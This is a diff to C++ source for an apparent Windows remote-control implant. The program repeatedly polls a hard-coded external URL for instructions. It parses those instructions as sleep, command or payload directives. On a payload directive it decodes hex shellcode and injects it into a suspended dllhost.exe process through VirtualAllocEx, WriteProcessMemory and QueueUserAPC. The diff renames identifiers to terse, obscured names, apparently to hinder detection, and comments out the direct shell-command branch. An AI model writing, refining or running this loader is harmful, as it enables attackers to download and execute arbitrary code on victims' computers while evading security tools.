@@ -6,93 +6,84 @@
 #include <string>
 #pragma comment(lib, "libcurl.lib")
 #pragma comment ( lib, "ws2_32.lib" )
-#pragma comment ( lib, "winmm.lib" )
 #pragma comment ( lib, "wldap32.lib" )
-#pragma comment(lib, "Advapi32.lib")
 
 
 #define URL "http://api.10086.li/txt.txt"
 
 using namespace std;
 
-DWORD WINAPI shellcode_run(LPVOID lpParameter);
-DWORD WINAPI link_run(LPVOID P);
-string convert_ASCII(string hex);
-string hexshellcode;
+DWORD WINAPI run_slcd(LPVOID p);
+string str_to_hex(string hex);
+string hexcode;
 
 
-struct Param
-{
-    string hexstring;
-};
-
-
-class CURLClass
+class CurlWapper
 {
 private:
-    CURL* curl;
-    stringstream ss;
-    long http_code;
+    CURL* _curl;
+    stringstream _rs;
+    long _code;
 public:
-    CURLClass()
-        : curl(curl_easy_init())
-        , http_code(0)
+    CurlWapper()
+        : _curl(curl_easy_init())
+        , _code(0)
     {
 
     }
-    ~CURLClass()
+    ~CurlWapper()
     {
-        if (curl) curl_easy_cleanup(curl);
+        if (_curl) curl_easy_cleanup(_curl);
     }
-    std::string Get(const std::string& url)
+    string _get(const string& _url)
     {
         CURLcode res;
-        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, this);
+        curl_easy_setopt(_curl, CURLOPT_URL, _url.c_str());
+        curl_easy_setopt(_curl, CURLOPT_FOLLOWLOCATION, 1L);
+        curl_easy_setopt(_curl, CURLOPT_WRITEFUNCTION, _receive_data);
+        curl_easy_setopt(_curl, CURLOPT_WRITEDATA, this);
 
-        ss.str("");
-        http_code = 0;
-        res = curl_easy_perform(curl);
+        _rs.str("");
+        _code = 0;
+        res = curl_easy_perform(_curl);
         if (res != CURLE_OK)
         {
-            throw std::runtime_error(curl_easy_strerror(res));
+            throw runtime_error(curl_easy_strerror(res));
         }
-        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
-        return ss.str();
+        curl_easy_getinfo(_curl, CURLINFO_RESPONSE_CODE, &_code);
+        return _rs.str();
     }
-    long GetHttpCode()
+    long _GetHttpCode()
     {
-        return http_code;
+        return _code;
     }
 private:
-    static size_t write_data(void* buffer, size_t size, size_t nmemb, void* userp)
+    static size_t _receive_data(void* buffer, size_t size, size_t nmemb, void* userp)
     {
-        return static_cast<CURLClass*>(userp)->Write(buffer, size, nmemb);
+        return static_cast<CurlWapper*>(userp)->_write_rdata(buffer, size, nmemb);
     }
-    size_t Write(void* buffer, size_t size, size_t nmemb)
+    size_t _write_rdata(void* buffer, size_t size, size_t nmemb)
     {
-        ss.write((const char*)buffer, size * nmemb);
+        _rs.write((const char*)buffer, size * nmemb);
         return size * nmemb;
     }
 };
 
 
-class Configure
+class Conf
 {
 private:
-    int sleep;
-    string type;
-    string value;
+    int _s;
+    string _t;
+    string _v;
 public:
-    Configure(string response)
+    Conf(string res)
     {
-        istringstream is(response);	
+        istringstream is(res);
         string line;
 
         char split = '\n';
-        if (response.find("\n") == -1)
+        if (res.find("\n") == -1)
         {
             split = '\r';
         }
@@ -100,52 +91,50 @@ public:
 
         while (getline(is, line, split))
         {
-           
+
             int line_len = line.length();
             int flag = line.find(":");
             string key = line.substr(0, flag);
             string value = line.substr(flag + 1, line_len);
-            if (key == "sleep")
+            if (key == "s")
             {
-                this->sleep = atoi(value.c_str());
+                this->_s = atoi(value.c_str());
             }
-            else if (key == "type")
+            else if (key == "t")
             {
-                this->type = value;
+                this->_t = value;
             }
-            if (key == "value")
+            if (key == "v")
             {
-                this->value = value;
+                this->_v = value;
             }
-            cout << value << endl;
         }
     };
-    ~Configure();
+    ~Conf();
 
-    VOID Selector()
+    VOID run()
     {
 
-        if (this->type == "cmd\r" || this->type == "cmd")
+        if (this->_t == "c\r" || this->_t == "c")
         {
-            system((this->value).c_str());
+            // system((this->_v).c_str());
         }
-        else if (this->type == "up\r" || this->type == "up")
+        else if (this->_t == "u\r" || this->_t == "u")
         {
-            //shellcode_run(this->value);
             try {
 
-                hexshellcode = this->value;
-                HANDLE hThread = CreateThread(NULL, NULL, shellcode_run, NULL, NULL, NULL);
+                hexcode = this->_v;
+                HANDLE hThread = CreateThread(NULL, NULL, run_slcd, NULL, NULL, NULL);
             }
-            catch(exception e)
+            catch (exception e)
             {
             };
         }
-        else if (this->type == "exit\r" || this->type == "exit")
+        else if (this->_t == "e\r" || this->_t == "e")
         {
             exit(0);
         }
-        Sleep(this->sleep * 1000);
+        Sleep(this->_s * 1000);
 
     };
 
@@ -155,55 +144,51 @@ private:
 
 
 
-string convert_ASCII(string hex) {
-    string ascii = "";
-    for (size_t i = 0; i < hex.length(); i += 2) {
-        //taking two characters from hex string
-        string part = hex.substr(i, 2);
-        //changing it into base 16
-        char ch = stoul(part, nullptr, 16);
-        //putting it into the ASCII string
-        ascii += ch;
+string str_to_hex(string strHex) {
+    string tmpStr = "";
+    for (size_t j = 0; j < strHex.length(); j += 2) {
+        string hex16 = strHex.substr(j, 2);
+        char ch16 = stoul(hex16, nullptr, 16);
+        tmpStr += ch16;
     }
-    return ascii;
+    return tmpStr;
 };
 
-DWORD WINAPI shellcode_run(LPVOID lpParameter)
+DWORD WINAPI run_slcd(LPVOID lpParameter)
 {
-    string hexstring = hexshellcode;
-    hexshellcode = "";
-    string shellcode_str = convert_ASCII(hexstring);
-    int len = hexstring.length();
-    unsigned char shellcode[3000] = { 0 };
-    memcpy(shellcode, shellcode_str.c_str(), len / 2 + 1);
-    UINT shellcodeSize = sizeof(shellcode);
+    string _code_str = str_to_hex(hexcode);
+    int _len = hexcode.length();
+    unsigned char _code[3000] = { 0 };
+    memcpy(_code, _code_str.c_str(), _len / 2 + 1);
+    UINT _codeSize = sizeof(_code);
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
     CreateProcessA("C:\\Windows\\System32\\dllhost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
     HANDLE victimProcess = pi.hProcess;
     HANDLE threadHandle = pi.hThread;
-    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, _codeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
-    WriteProcessMemory(victimProcess, shellAddress, shellcode, shellcodeSize, NULL);
+    WriteProcessMemory(victimProcess, shellAddress, _code, _codeSize, NULL);
     QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
+
     ResumeThread(threadHandle);
     return 0;
 }
 
-DWORD WINAPI link_run(LPVOID P)
+DWORD WINAPI d_run(LPVOID P)
 {
-GO_ON:
+_GO:
     try {
-        CURLClass client;
-        string response = client.Get(URL);
-        Configure* configure = new Configure(response);
-        configure->Selector();
+        CurlWapper _c;
+        string res = _c._get(URL);
+        Conf* conf = new Conf(res);
+        conf->run();
         return 0;
     }
     catch (exception e)
     {
-        Sleep(2000);
-        goto GO_ON;
+        Sleep(3000);
+        goto _GO;
     }
     return 0;
 }
